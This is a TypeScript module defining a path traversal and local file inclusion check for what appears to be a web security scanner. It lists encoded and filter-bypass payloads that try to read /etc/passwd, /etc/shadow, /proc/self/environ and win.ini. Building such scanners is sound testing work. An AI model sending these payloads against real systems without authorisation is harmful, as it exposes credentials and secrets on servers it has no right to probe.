// Path traversal / LFI active check family.
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant } from '../types';

export const META = {
  id: 'lfi-traversal',
  family: 'lfi-traversal' as const,
  name: 'Path Traversal / LFI',
  description: 'Detects local file inclusion via directory traversal sequences.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'path', 'json'],
};

const PATH_TRAVERSAL_PROBES = [
  { value: '../../../etc/passwd', intent: 'Unix path traversal to /etc/passwd', signals: ['file-content'] },
  { value: '..%2f..%2f..%2fetc%2fpasswd', intent: 'URL-encoded traversal', signals: ['file-content'] },
  { value: '..%252f..%252f..%252fetc%252fpasswd', intent: 'Double URL-encoded traversal', signals: ['file-content'] },
  { value: '....//....//....//etc/passwd', intent: 'Dotdot-slash bypass for filter stripping ../', signals: ['file-content'] },
  { value: '../../../etc/shadow', intent: 'Shadow password file traversal', signals: ['file-content'] },
  { value: '..\\..\\..\\windows\\win.ini', intent: 'Windows path traversal to win.ini', signals: ['file-content'] },
  { value: '..%5c..%5c..%5cwindows%5cwin.ini', intent: 'URL-encoded Windows backslash traversal', signals: ['file-content'] },
  { value: '/etc/passwd', intent: 'Absolute path injection (no traversal needed)', signals: ['file-content'] },
  { value: 'file:///etc/passwd', intent: 'file:// URI scheme for absolute path', signals: ['file-content'] },
  { value: '../../../proc/self/environ', intent: 'Linux process environment variable leak', signals: ['file-content'] },
];

export function variants(): PayloadVariant[] {
  return PATH_TRAVERSAL_PROBES.map((probe, i) => ({
    id: `lfi-${i + 1}`,
    family: 'lfi-traversal' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
